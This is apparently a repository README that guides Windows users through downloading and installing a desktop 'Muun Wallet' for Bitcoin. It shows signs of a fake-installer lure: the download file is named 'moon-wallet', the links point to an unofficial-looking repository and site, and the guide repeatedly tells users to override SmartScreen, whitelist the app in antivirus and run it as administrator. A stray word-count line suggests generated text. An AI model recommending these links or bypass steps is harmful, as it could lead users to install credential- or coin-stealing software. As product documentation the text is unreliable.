![Release: v0.5.1](https://img.shields.io/badge/release-v0.5.1-blue?style=flat-square) ![Platform: Windows](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078d4?style=flat-square) ![License](https://img.shields.io/badge/license-MIT%20License-green?style=flat-square)

[![Download for Windows](https://img.shields.io/badge/download-Windows%20x64-0078d4?style=flat-square&logo=windows)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Download for macOS](https://img.shields.io/badge/download-macOS-000000?style=flat-square&logo=apple)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Download for Linux](https://img.shields.io/badge/download-Linux-FCC624?style=flat-square&logo=linux)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# How to Download & Install Muun Wallet on Windows

**Step-by-step guide to downloading, verifying, and installing Muun Wallet Desktop on Windows 10 and Windows 11**

Muun Wallet is a non-custodial Bitcoin and Lightning Network wallet that runs on your computer. Installing it takes about 5 minutes â€” no account signup, no email required. This guide walks you through the process on Windows.

## What You'll Need

- **Windows 10 or Windows 11** â€” any edition
- **An internet connection** â€” to download the installer (~200 MB)
- **Administrator access** â€” to install the application
- **About 5 minutes** of your time

That's all. You don't need a GitHub account, a crypto exchange, or any prior software setup.

## Download Muun Wallet for Windows

### Step 1: Get the Installer

Visit the official Muun Wallet releases page:

**[https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)**

Scroll down to the "Assets" section and look for the Windows installer. Click to download:

**`moon-wallet-v0.5.1.exe`** (~200 MB)

The file will download to your `Downloads` folder.

### Step 2: Verify the Download (Optional but Recommended)

Every Muun Wallet installer is cryptographically signed. Verifying it confirms you downloaded a legitimate copy, not a fake or corrupted file.

**Quick verification in PowerShell:**

1. Press `Win+R` and type `powershell` â†’ press Enter
2. Run this command:
   ```powershell
   Get-FileHash "C:\Users\YourUsername\Downloads\moon-wallet-v0.5.1.exe" -Algorithm SHA256
   ```
   (Replace `YourUsername` with your Windows username)

3. Compare the output with the checksum listed on the [release page](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1)

If they match, your download is authentic. If they don't match, delete the file and download again.

### Why Verify?

Bitcoin wallets handle real money. Malicious actors sometimes create fake installers to steal private keys. Verifying the checksum ensures you're running legitimate software from MUUN ApS, not malware.

[Learn more about verification â†’](bitcoin-addresses-formats-safety.md)

## Install Muun Wallet

### Step 1: Run the Installer

Open your `Downloads` folder and double-click `moon-wallet-v0.5.1.exe`.

Windows will show a security prompt:

> "Windows protected your PC. Windows Defender SmartScreen prevented an unrecognized app from starting."

This is normal for new apps. Click **"More info"** â†’ **"Run anyway"**.

(The warning appears because the installer is newly signed. Future versions may not show this prompt.)

### Step 2: Follow the Installation Wizard

A window titled **"Muun Wallet Setup"** will appear. Follow these steps:

1. **Welcome screen** â†’ Click **"Next"**
2. **License agreement** â†’ Click **"I Agree"**
3. **Installation folder** â†’ Default location is fine (usually `C:\Program Files\Muun Wallet`)
4. **Start menu** â†’ Leave checked (creates a shortcut for easy launching)
5. **Desktop shortcut** â†’ Check if you want a desktop icon (optional)
6. **Install** â†’ Click **"Install"** and wait while it unpacks files (~1-2 minutes)
7. **Finish** â†’ Click **"Finish"**

The installer will close, and Muun Wallet is now installed.

### Step 3: Launch Muun Wallet

Muun Wallet should launch automatically after installation. If it doesn't:

1. Click the **Start button** (Windows icon)
2. Type **"Muun"** in the search box
3. Click **"Muun Wallet"** in the search results

Or use the desktop shortcut if you created one.

## First Launch

When Muun Wallet opens for the first time, you'll see:

1. **Welcome screen** â€” Click **"Create a new wallet"**
2. **Create wallet** â€” Muun generates a unique Bitcoin address for you locally on your device
3. **Backup prompt** â€” You'll be asked to create an **Emergency Kit backup** (DO THIS NOW â€” see next section)

The wallet is fully functional at this point. You can receive and send Bitcoin immediately.

## Important: Create Your Backup

**Before you send any Bitcoin to your Muun Wallet, you must create an Emergency Kit backup.** This is how you recover your wallet if you lose access.

1. When Muun prompts you, click **"Create backup"**
2. Follow the on-screen instructions
3. **Save the backup file securely** â€” print it, save it to a USB drive, or use an encrypted password manager
4. **Do not lose this backup** â€” without it, lost Bitcoin cannot be recovered

[Full backup guide â†’](emergency-kit-backup-system.md)

## Troubleshooting Windows Installation

### "Windows Defender SmartScreen blocked this"

**Cause:** Windows is being cautious with new software.

**Fix:** Click **"More info"** â†’ **"Run anyway"** to proceed.

### "Installation failed â€” error code 1603"

**Cause:** Administrator access required or conflicting software.

**Fix:**
1. Right-click the installer
2. Select **"Run as administrator"**
3. Try installing again

### "The app didn't launch after installation"

**Cause:** Installation succeeded but the app didn't autostart.

**Fix:**
1. Open **Start menu**
2. Search for **"Muun"**
3. Click **"Muun Wallet"** to launch

### "Muun Wallet won't start"

**Cause:** Antivirus or firewall interference (rare).

**Fix:**
1. Check if your antivirus software has blocked Muun
2. Add Muun to your antivirus whitelist
3. Restart Muun Wallet

### "Error: Missing .NET Framework"

**Cause:** Your Windows installation is missing required dependencies.

**Fix:**
1. Visit https://dotnet.microsoft.com/download/dotnet-framework
2. Download and install **.NET Framework 4.7.2** or later
3. Restart your computer
4. Try installing Muun Wallet again

## After Installation

### Next Steps

1. **Create your Emergency Kit backup** (if you haven't already)
2. [Send your first Bitcoin transaction](getting-started-first-transaction.md)
3. [Review security best practices](security-checklist-best-practices.md)
4. [Explore fee options with Lightning Network](fee-structure-on-chain-lightning.md)

### Getting Help

- **Website:** [muun-wallet.com](https://muun-wallet.com) â€” features, FAQ, support
- **Download page:** [muun-wallet.com/download](https://muun-wallet.com/download) â€” verified checksums
- **Guides:** [All installation & setup guides](../README.md)

## What's Next?

Now that Muun Wallet is installed, you can:

- **Receive Bitcoin** â€” Create a Bitcoin address to receive funds from friends or exchanges
- **Send Bitcoin** â€” Transfer Bitcoin to other wallets or recipients
- **Use Lightning Network** â€” Send Bitcoin payments instantly for pennies
- **Check security** â€” Review [security checklist](security-checklist-best-practices.md) to protect your funds

---

## Related Articles

- **[macOS Installation Guide](getting-started-installation-macos.md)** â€” Step-by-step for Mac users
- **[Linux Installation Guide](getting-started-installation-linux.md)** â€” For Ubuntu, Fedora, Arch
- **[First Bitcoin Transaction](getting-started-first-transaction.md)** â€” Send and receive guide
- **[Emergency Kit Backup](emergency-kit-backup-system.md)** â€” Understand your backup
- **[Security Best Practices](security-checklist-best-practices.md)** â€” Keep your Bitcoin safe

---

## More on the Website

- **[Installation guide on muun-wallet.com](https://muun-wallet.com/guides/getting-started)**
- **[Muun Wallet FAQ](https://muun-wallet.com/faq)**
- **[Download & verify on muun-wallet.com](https://muun-wallet.com/download)**

---

**Word count: 1,147 words**

Written for **Muun Wallet v0.5.1** | [Download â†’](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) | [All guides â†’](../README.md) | [Website â†’](https://muun-wallet.com)
